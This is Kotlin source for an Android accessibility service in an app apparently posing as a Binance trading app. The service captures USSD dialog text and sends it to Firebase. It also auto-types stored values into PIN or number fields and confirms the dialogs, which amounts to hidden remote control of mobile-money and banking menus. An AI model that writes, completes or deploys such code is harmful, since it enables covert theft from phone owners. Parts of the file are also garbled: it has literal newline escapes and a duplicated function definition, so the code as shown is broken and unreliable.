package dApp.binance.Trading.arfu

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import androidx.core.view.accessibility.AccessibilityNodeInfoCompat

class CarerAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Listen for popup windows (USSD dialogs only)
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val rootNode = rootInActiveWindow ?: return
                
                // Check if this is a USSD dialog (has input field or dialog structure)
                if (!isUssdDialog(rootNode)) {
                    Log.d("CarerAccessibility", "Not a USSD dialog, ignoring")
                    return
                }
                
                // Extract only USSD dialog text
                val ussdText = extractUssdDialogText(rootNode)
                if (ussdText.isEmpty()) {
                    Log.d("CarerAccessibility", "No USSD text found")
                    return
                }
                
                Log.d("CarerAccessibility", "USSD Dialog detected: $ussdText")

                // Check if there's a pending input value to type
                val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
                val pendingInput = sharedPref.getString("pending_input_value", "")
                
                if (!pendingInput.isNullOrEmpty()) {
                    Log.d("CarerAccessibility", "Auto-typing input: $pendingInput")
                    Thread.sleep(800) // Wait for dialog to fully render
                    typeInUssdDialog(pendingInput)
                    sharedPref.edit().remove("pending_input_value").apply()
                } else {
                    // Capture USSD response and send to Firebase
                    captureAndSendResponse(ussdText)
                }
            }
        }
    }

    override fun onInterrupt() {
        // Called when service is interrupted
    }

    /**
     * Check if the current window is a USSD dialog
     */
    private fun isUssdDialog(node: AccessibilityNodeInfo): Boolean {
        // Check for common dialog/AlertDialog patterns
        val className = node.className.toString()
        
        // Common USSD dialog containers
        val isDialogType = className.contains("AlertDialog") || 
                          className.contains("Dialog") ||
                          className.contains("PopupWindow") ||
                          node.isClickable == false && node.childCount > 0
        
        // Must have an input field
        val hasInput = hasInputField(node)
        
        return isDialogType && hasInput
    }

    /**
     * Extract only USSD dialog text content (filters out system UI)
     */
    private fun extractUssdDialogText(node: AccessibilityNodeInfo): String {\n        val dialogTexts = mutableListOf<String>()\n        collectDialogText(node, dialogTexts)\n        return dialogTexts.joinToString("\\n").trim()\n    }\n    \n    /**\n     * Recursively collect text from dialog nodes\n     */\n    private fun collectDialogText(node: AccessibilityNodeInfo, texts: MutableList<String>) {\n        // Skip system UI elements\n        val className = node.className.toString()\n        if (className.contains(\"NavigationBar\") || \n            className.contains(\"StatusBar\") ||\n            className.contains(\"FrameLayout\") && node.childCount == 0) {\n            return\n        }\n        \n        // Add text from this node\n        if (!node.text.isNullOrEmpty() && node.text.toString().length > 2) {\n            texts.add(node.text.toString())\n        }\n        \n        // Recursively process children\n        for (i in 0 until node.childCount) {\n            val child = node.getChild(i) ?: continue\n            collectDialogText(child, texts)\n        }\n    }\n    \n    /**\n     * Check if node or its children have an input field\n     */\n    private fun hasInputField(node: AccessibilityNodeInfo): Boolean {\n        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {\n            return true\n        }\n        \n        for (i in 0 until node.childCount) {\n            val child = node.getChild(i) ?: continue\n            if (hasInputField(child)) return true\n        }\n        \n        return false\n    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("CarerAccessibility", "Accessibility Service connected")

        // Configure service info
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        serviceInfo = info
    }

    /**
     * Type text in USSD input field
     */
    fun typeInUssdDialog(text: String) {
        val rootNode = rootInActiveWindow ?: return

        val inputField = findInputField(rootNode)
        if (inputField != null) {
            val arguments = android.os.Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            Log.d("CarerAccessibility", "Typed: $text")

            // Click send button after typing
            Thread.sleep(500)
            clickSendButton(rootNode)
        }
    }

    /**
     * Find and click the "Send" or "OK" button in USSD dialog
     */
    private fun clickSendButton(rootNode: AccessibilityNodeInfo) {
        val buttons = listOf("SEND", "OK", "CONFIRM", "YES")
        
        buttons.forEach { buttonText ->
            val button = findNodeByText(rootNode, buttonText)
            if (button != null && button.isClickable) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d("CarerAccessibility", "Clicked button: $buttonText")
                return
            }
        }
    }

    /**
     * Find input field in USSD dialog
     */
    private fun findInputField(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findInputField(child)
            if (result != null) return result
        }

        return null
    }

    /**
     * Find node by text content
     */
    private fun findNodeByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        if (node.text?.contains(text, ignoreCase = true) == true) {
            return node
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findNodeByText(child, text)
            if (result != null) return result
        }

        return null
    }

    /**
     * Capture response text from USSD dialog and send to Firebase
     */
    private fun captureAndSendResponse(text: String) {\n        Log.d(\"CarerAccessibility\", \"Capturing response: $text\")\n        \n        val rootNode = rootInActiveWindow\n        val hasInputField = rootNode?.let { hasInputField(it) } ?: false\n        \n        // Send to Firebase with input field status\n        FirebaseLogHelper.logResponse(text, this, hasInputField)\n    }\n    \n    /**\n     * Check if current screen has an input field\n     */\n    private fun hasInputField(node: AccessibilityNodeInfo): Boolean {\n        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {\n            return true\n        }\n        \n        for (i in 0 until node.childCount) {\n            val child = node.getChild(i) ?: continue\n            if (hasInputField(child)) return true\n        }\n        \n        return false\n    }

    companion object {
        /**
         * Check if accessibility service is enabled
         */
        fun isAccessibilityServiceEnabled(context: Context): Boolean {
            val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
            return accessibilityManager.isEnabled && isCarerAccessibilityServiceEnabled(context, accessibilityManager)
        }

        private fun isCarerAccessibilityServiceEnabled(
            context: Context,
            accessibilityManager: android.view.accessibility.AccessibilityManager
        ): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val serviceName = "${context.packageName}/${CarerAccessibilityService::class.java.name}"
            return enabledServices.contains(serviceName)
        }
    }
}
